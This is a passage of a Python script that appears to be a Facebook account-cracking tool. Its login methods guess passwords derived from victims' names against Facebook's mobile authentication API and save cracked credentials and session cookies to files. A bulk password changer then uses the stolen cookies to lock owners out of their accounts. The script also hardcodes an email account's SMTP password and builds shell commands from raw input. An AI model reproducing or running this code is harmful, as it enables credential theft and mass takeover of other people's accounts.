					p('\r\033[1;91m[PTI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/PTI_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [PTI %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod3Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[PTI-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/PTI_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/PTI_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[PTI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/PTI_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [PTI] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				params = {
					"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
					"sdk_version": f"{str(random.randint(1,26))}", 
					"email": uid,
					"locale": "en_PK",
					"password": pw,
					"sdk": "Android",
					"generate_session_cookies": "1",
					"sig": "374e60f8b9bb6b8cbb30f78030438895"
				}
				headers = {

					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": iAmMethod4Ua(),
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger",
					"Authorization":"Auth2 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
				}
				q = ses.post("https://b-graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					#print(q)
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[PTI-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/PTI_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/PTI_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[PTI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/PTI_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method4(uid,nm,pwx)
		except Exception as e:
			self.method4(uid,nm,pwx)
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [PTI] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"device":"Samsung",
"sdk":"Android",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': R_Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[PTI-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/PTI_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/PTI_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[PTI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/PTI_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.r_crack(uid,pwx)
		except Exception as e:
			print(e)
class Join:
	def __init_(self):
		logo()
		os.system("xdg-open https://wa.me/+923021431324")
	def Whatsapp(self):
		os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
		iAmMain().iAmMenu()
	def Facebook(self):
		os.system('xdg-open https://www.facebook.com/groups/1020338239226719/')
		iAmMain().iAmMenu()

class Grep:
	def __init__(self):
		logo()

	def remove_links(self):
		file = input(" [✓] File Path :- ")
		try:
			open(file,'r').read()
			print("	[✓]	Example  /sdcard/PTI.txt   ")
			out = input("  [=] Save Path :- ")
			os.system('touch '+out)
			os.system('sort -r '+file+' | uniq > '+out)
			p("  [ All double links are Removed ] ")
			p(" [•] Your File Saved in %s "%(out))
			input("  [ Press Enter To Go Back ] ")
			time.sleep(1)
			self.remove_links()
		except:
			p("  [ File Not Found ]  ");sp(1);self.remove_links()


	def links_only(self):
		os.system("rm -rf .tmp.txt")
		try:
			p(" [  Example  :-  /sdcard/file.txt  ] ")
			file = input(" [•|•] Enter File Path :- ")
			line()
			p("	Example  :-  /sdcard/PTI.txt   ")
			sav = input(" [✓] Enter Save Path :- ")
			line()
			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
			try:
				limit = int(input(" [•|•] how many links you wants to grep :- "))
				line()
			except:
				limit = 1
			t = open(file,"r").read().splitlines()
			xx = open(".tmp.txt","a")
			for x in t:
				uid = x.split("|")[0]
				xx.write(uid+'\n')
				xx.close()
			p("	  Example  :-  100089,88,87 etc")
			for n in range(limit):
				print(open(".tmp.txt","r").read().splitlines())
				digit = int(input(" [•|•] Enter Digit %s :- "%(n+1)))
				line()
				os.system('cat .tmp.txt | grep '+str(digit)+' >>'+sav+' ')
				p(" [	Your File Saved in :- %s ]  "%(sav))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.links_only()
		except Exception as e:
				print(" [^=^] Your File Not Found :( ")
				sp(2);self.links_only()


	def with_names(self):

		try:
			p("	Example  :-  /sdcard/file.txt	")
			line()
			file = input(" [✓] File Path :- ")
			line()
			p("	Example  :-  /sdcard/PTI.txt 	")
			ofile= input(" [✓] File Save Path :- ")
			line()
			try:
				p("	 Example :-  1 ,2,3,4,5 etc	")
				limit = int(input(" [=] How many Links with names you wanna grab :- "))
			except:
				limit = 2
			p("	Example  :-	100089 , 100088 etx  ")
			for n in range(limit):
				line()
				digit = int(input(" [•|•] Put Digits %s :- "%(n+1)))
				os.system('cat '+file+' | grep '+str(digit)+' >>'+ofile+' ')
				p(" [	Your File Saved in :- %s ]  "%(ofile))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.with_names()
		except:
			p("	[X] File Not Found ;(  ");sp(1);self.with_names()


class Server:
	def report(self):
		logo()
		print(" [•] Ex Cp issues/New updates Etc ")
		print(' [•] Please Describe issues in details\n [•] It will be send to Admin ')
		line()
		issue = input(' [•] Describe your Problem : ')
		name = input(' [•] Enter Your Name :- ')
		email = input(' [•] Enter Your Email/Contact/Fb Link : ')
		print(' [•] Sending Your Appeal .....')
		form = f'	__________________\n	Full Name : {name} \n	Email  : {email} \n	Issues : {issue} '
		TEXT = form
		SUBJECT = " Dilute Codes Users Feedback"
		message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
		se = "serverdilute@gmail.com"
		rse = "serverdilute@merry.pink"
		username = "serverdilute@gmail.com"
		password = "usqscwnpoyehoytc"
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.ehlo()
		server.starttls()
		server.login(username, password)
		server.sendmail(se, rse, message)
		print(" [•] Your Appleal Has been Submitted ")
		print(form)
		exit()

		
class automation:
	def __init__(self):
		self.url = "https://free.facebook.com"
	def menu(self):
		logo()
		
		p(" [1] Facebook Password Change Menu ")
		p(' [2] Cut Used File lines ')
		am = input(" [•] Select an option : ")
		if am == "1":self.iAmPasswordManager()
		elif am == "2":self.used_cutter()
		else:
			p(" [•] wrong select!! ");sp(2);self.menu()
	def used_cutter(self):
		clear()
		logo()
		lines=[]
		p(" [•] Ex : /sdcard/file.txt")
		try:
			file = input(" [•] Put File Path : ")
		except Exception as e:
			print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
		digit= int(input(" [•] Put Line Num :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		p(" [•] File Splitted Complete")
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : PTI")
		line()
		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
		line()
		iamoption = input(' [•] Choose : ')
		if iamoption == '1':
			self.bulk_password()
		elif iamoption =='2':
			self.single_password()
		elif iamoption =='3':
			self.change_default()
		elif iamoption =='B':
			iAmApprovelSystem()
		else:
			p(" [•] Wrong Select ! ")
			sp(2);self.iAmPasswordManager()
	
	def bulk_password(self):
		sav = "/sdcard/dilute_passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "PTI@@@"
		logo()
		p(" [•] Password Changer By : PTI")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		try:
			file = input(" [•] Put File Path : ")
			id = open(file,"r").read().splitlines()
		except FileNotFoundError:
			print(" [•] File Not Found ! ")
			sp(2)
			self.bulk_password()
		logo()
		print(" [•] Password Changing Procces is started ! ")
		line()
		p(" [•] Total File Accounts : %s "%(len(id)))
		line()
		p(" [•] Please Be Patience Use Fast Internet ")
		line()
		for x in id:
			uid = x.split("|")[0]
			pw = x.split('|')[1]
			cok = x.split('|')[2]
			cookies = {"cookie":cok}
			
			try:
				r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
			except CE:
				p(" [•] Check Your Internet")
			except Exception as e:
				print(e)
			if "/zero/optin/write/?" in r:
				self.iAmFreeMode(cookies,r)
			try:
				r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
				r= r.replace("amp;","")
			except CE:
				print(" [•] Check Your Internet Unexpected Stopped ! ")
				exit()
			
			next = re.findall('action\="(.*?)"',r)[1]
			data = {
		"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
		"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
		"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
			po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
			po = po.replace("amp;","")
			if 'Password changed' in po:
				p(" [•]  \033[1;92m✓ Password Changed Succesfully : \033[1;97m%s "%(uid))
				open(sav,"a").write(uid+'|'+np+'\n')
			else:
				p(" [•]\033[1;91m Failed To Changed Password : \033[1;97m%s "%(uid))
		line()
		print(" [•] Proccess Has Been Completed ! ")
		print(" [•] Your File Saved in %s "%(sav))
		line()
		input(" [•] Press Enter To Go Back to Password Menu ! ")
		sp(1)
		self.iAmPasswordManager()
		
		
	def single_password(self):
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "PTI"
		logo()
		p(" [•] Password Changer By : PTI ")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		pw = input(" [•] Put Old Pass : ")
		cok = input(" [•] Paste Cookies : ")
		cookies = {'cookie':cok}
		try:
			r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
		except CE:
			p(" [•] Check Your Internet")
		except Exception as e:
			print(e)
		if "/zero/optin/write/?" in r:
			self.iAmFreeMode(cookies,r)
		r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
	"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
	"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
	"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
		po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
		
		po = po.replace("amp;","")
		if 'Password changed' in po:
			p(" [•]  ✓ Password Changed Succesfully ")
			
			sp(2)
			input(" [•] Press Enter To Go Backk")
			self.iAmPasswordManager()
		else:
			p(" [•] Failed To Changed Password ")
	def iAmFreeMode(self,cookies,r):
		for x in re.findall('action\=\"(.*?)"',r):
			if "/zero/optin/write/?" in x:
				next = x
		data ={}
		fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"',r).group(1)
		jazoest = re.search('name="jazoest" value="(.*?)"',r).group(1)
		data.update(
		{
		'fb_dtsg':fb_dtsg,
		'jazoest':jazoest,
		'submit':'Continue'
		}
		)
		po = requests.post('https://free.facebook.com'+str(x),cookies=cookies,data=data,allow_redirects=False)
	
	def change_default(self):
		logo()
		
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "PTI786"
		p(" [•] Default Password : %s"%(iamdefaultpassword))
		line()
		os.system("rm -rf .default_password.txt ")
		change_pw = input(" [•] Put New Default Password : ")
		if len(change_pw) < 6:
			print(" [•] Password Should be Six Characters More .")
			sp(2)
			self.change_default()
		
		t = open(".default_password.txt","w").write(change_pw)
		print(" [•] Default Password is Changed ! ")
		p(" [•] Your New Password : %s "%(change_pw))
		line()
		input("[•] Press Enter to go back ")
	
		self.iAmPasswordManager()


if __name__=="__main__":
	#update()
	iAmMain().iAmMenu()
	#iAmMain().method4('100089112641726','vishnu singh',['Muhammad Siyal'])
